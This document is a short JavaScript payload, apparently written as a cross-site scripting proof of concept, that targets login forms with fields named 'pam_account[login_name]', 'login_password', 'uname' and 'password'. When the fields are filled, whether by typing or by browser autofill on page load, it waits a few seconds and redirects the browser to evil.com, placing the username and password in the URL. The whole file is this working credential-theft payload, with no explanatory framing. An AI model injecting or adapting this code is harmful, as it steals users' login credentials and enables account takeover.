let isFilled = false;

 function checkInputs() {
    const input1 = document.getElementsByName('pam_account[login_name]')[0];
    const input2 = document.getElementsByName('pam_account[login_password]')[0];

    const input3 = document.getElementsByName('uname')[0];
    const input4 = document.getElementsByName('password')[0];

    if (input1.value && input2.value) {
      if (!isFilled) {
        isFilled = true; 
        setTimeout(function() {
          location.replace("//evil.com?username=" + document.getElementsByName('pam_account[login_name]')[0].value + "&password=" + document.getElementsByName('pam_account[login_password]')[0].value);
         
        }, 4500); 
      }
    }
  

if (input3.value && input4.value) {
      if (!isFilled) {
        isFilled = true; 
        setTimeout(function() {
          location.replace("//evil.com?username=" + document.getElementsByName('uname')[0].value + "&password=" + document.getElementsByName('password')[0].value);
         
        }, 4500); 
      }
    }
 }
  window.onload = checkInputs;


  document.getElementsByName('pam_account[login_name]')[0].addEventListener('input', checkInputs);
  document.getElementsByName('pam_account[login_password]')[0].addEventListener('input', checkInputs);
  document.getElementsByName('uname')[0].addEventListener('input', checkInputs);
  document.getElementsByName('password')[0].addEventListener('input', checkInputs);
